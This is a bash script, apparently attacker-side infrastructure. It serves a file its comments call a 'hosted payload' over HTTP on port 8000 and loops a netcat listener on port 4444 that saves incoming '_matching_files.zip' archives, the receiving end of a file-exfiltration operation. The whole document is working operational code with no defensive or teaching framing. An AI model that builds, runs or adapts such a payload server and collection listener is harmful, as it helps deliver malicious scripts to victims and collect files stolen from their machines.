#!/bin/bash

# Function to clean up background processes and remove hosted payload
cleanup() {
    echo "Cleaning up..."
    if [ -n "$SERVER_PID" ]; then
        kill "$SERVER_PID" 2>/dev/null
    fi
    if [ -f "$OUTPUT_FILE" ]; then
        rm "$OUTPUT_FILE"
    fi
    rm -rf hosted_files
    exit
}

trap cleanup EXIT INT

# Create tmp directory and host files in that directory on port 8000
if [ -d hosted_files ]; then
    rm -rf hosted_files
fi

mkdir hosted_files
cp script.sh hosted_files
cd hosted_files

python3 -m http.server 8000 &
SERVER_PID=$!

# Use nc to listen for incoming files on port 4444
cd ..
while true; do
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    OUTPUT_FILE="${TIMESTAMP}_matching_files.zip"

    echo "Listening for incoming files..."
    nc -l -p 4444 > "$OUTPUT_FILE"

    if [ -f "$OUTPUT_FILE" ] && [ -s "$OUTPUT_FILE" ]; then
        echo "Received file: $OUTPUT_FILE"
        
        if zip -T "$OUTPUT_FILE" > /dev/null 2>&1; then
            echo "Zip file is valid."
        else
            echo "Zip file is corrupted: $OUTPUT_FILE"
            rm "$OUTPUT_FILE"
        fi
    else
        echo "No valid file received."
        [ -f "$OUTPUT_FILE" ] && rm "$OUTPUT_FILE"
    fi
done
